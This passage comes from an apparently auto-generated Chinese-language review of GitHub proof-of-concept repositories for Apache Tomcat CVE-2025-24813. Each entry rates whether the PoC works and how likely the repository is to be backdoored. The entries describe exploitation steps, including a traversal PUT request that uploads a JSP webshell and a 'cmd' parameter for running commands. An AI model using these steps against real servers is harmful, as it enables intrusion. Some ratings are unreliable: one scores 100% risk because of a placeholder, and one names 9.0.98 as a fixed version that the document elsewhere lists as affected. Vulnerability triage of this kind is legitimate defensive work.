    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

